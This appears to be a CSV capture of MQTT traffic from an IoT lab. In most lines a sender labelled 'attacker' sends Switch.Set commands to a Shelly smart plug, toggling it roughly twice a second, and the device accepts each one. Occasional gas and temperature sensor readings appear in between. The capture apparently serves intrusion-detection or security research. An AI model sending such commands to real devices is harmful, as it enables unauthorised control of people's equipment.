2026-04-22T16:19:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33276.46,""swi"
2026-04-22T16:19:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3858 33276.486 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3859 33276.964 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33276.96,""swi"
2026-04-22T16:19:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3860 33276.980 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3861 33277.465 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33277.46,""swi"
2026-04-22T16:19:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3862 33277.484 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3863 33277.964 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33277.96,""swi"
2026-04-22T16:19:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3864 33277.981 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3865 33278.465 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33278.46,""swi"
2026-04-22T16:19:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3866 33278.484 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3867 33278.971 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33278.97,""swi"
2026-04-22T16:19:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3868 33278.987 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3869 33279.466 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33279.46,""swi"
2026-04-22T16:19:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3870 33279.484 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3871 33279.966 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33279.96,""swi"
2026-04-22T16:19:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3872 33279.983 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3873 33280.470 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33280.47,""swi"
2026-04-22T16:19:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3874 33280.488 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3875 33280.975 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33280.97,""swi"
2026-04-22T16:19:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3876 33280.991 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3877 33281.475 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33281.47,""swi"
2026-04-22T16:19:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3878 33281.493 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3879 33281.976 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33281.97,""swi"
2026-04-22T16:19:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3880 33281.993 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3881 33282.476 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33282.47,""swi"
2026-04-22T16:19:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3882 33282.495 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3883 33282.977 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33282.97,""swi"
2026-04-22T16:19:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3884 33282.993 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3885 33283.479 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33283.48,""swi"
2026-04-22T16:19:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3886 33283.497 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3887 33283.977 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33283.97,""swi"
2026-04-22T16:19:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3888 33283.994 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3889 33284.478 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33284.47,""swi"
2026-04-22T16:19:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3890 33284.496 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3891 33284.978 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33284.98,""swi"
2026-04-22T16:19:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3892 33284.995 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3893 33285.480 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33285.48,""swi"
2026-04-22T16:19:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3894 33285.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3895 33285.980 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33285.98,""swi"
2026-04-22T16:19:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3896 33285.996 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3897 33286.480 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":230.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33286.48,""swi"
2026-04-22T16:19:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3898 33286.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3899 33286.982 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33286.98,""swi"
2026-04-22T16:19:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3900 33286.998 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3901 33287.481 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33287.48,""swi"
2026-04-22T16:19:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3902 33287.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3903 33287.982 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33287.98,""swi"
2026-04-22T16:19:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3904 33287.998 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3905 33288.483 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33288.48,""swi"
2026-04-22T16:19:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 3906 33288.502 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 3907 33288.982 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":230.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33288.98,""swi"
2026-04-22T16:19:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 3908 33288.998 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
